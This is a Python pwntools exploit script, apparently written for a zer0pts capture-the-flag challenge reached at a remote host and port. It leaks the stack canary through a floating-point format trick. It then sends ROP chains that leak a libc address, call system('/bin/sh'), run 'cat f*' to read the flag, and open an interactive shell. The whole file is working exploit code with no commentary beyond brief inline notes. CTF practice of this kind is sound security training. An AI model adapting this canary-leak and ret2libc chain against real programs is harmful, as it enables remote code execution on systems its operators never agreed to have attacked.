from pwn import *
import struct
import string

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

DEBUG = False
def spawn():
    global p, libc
    try:
        p.close()
    except:
        pass
    if DEBUG:
        p = process('./chall')
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    else:
        p = remote('pwn.ctf.zer0pts.com', 9002)
        libc = ELF('./libc.so.6')

while True:
    spawn()

    p.sendlineafter('> ', 'A'*(0x100 - 0xa0) + '/bin/sh')
    p.sendlineafter('> ', '16')  # overlap canary w/ %lf arg pos

    p.sendlineafter('Time[sec]: ', 'a')
    p.recvuntil('Stop the timer as close to ')
    canary_as_double = p.recvline().split()[0]

    if len(canary_as_double) < 15:  # simple significance check
        log.warning('Significance lost, retry')
        continue

    canary = u64(struct.pack('<d', float(canary_as_double)))
    if canary & 0xff != 0:
        log.warning('Canary ascii armor check failed, retry')
        continue
    
    if any(c in p64(canary) for c in string.whitespace):
        log.warning('whitespace in canary, retry')
        continue
    
    log.success('Canary: {:016x}'.format(canary))
    break

p.sendline('')
p.sendline('')
p.recvuntil('Play again? (Y/n) ')

payload  = 'A'*0x18
payload += p64(canary)
payload += p64(0)  # old rbp
payload += p64(0x400E93)  # pop rdi
payload += p64(0x601FF0)  # __libc_start_main
payload += p64(0x4006D0)  # puts@plt
payload += p64(0x40089B)  # ask_again

assert not any(c in payload for c in string.whitespace)

p.sendline(payload)

libc.address = u64(p.recv(6) + '\0\0') - libc.symbols['__libc_start_main']
assert libc.address & 0xfff == 0
log.success('libc: {:016x}'.format(libc.address))

payload  = 'A'*0x18
payload += p64(canary)
payload += p64(0)  # old rbp
payload += p64(0x400E93)  # pop rdi
payload += p64(0x602100)  # "/bin/sh"
payload += p64(0x400E94)  # ret (align)
payload += p64(libc.symbols['system'])

p.sendline(payload)

p.sendline('cat f*')

p.interactive()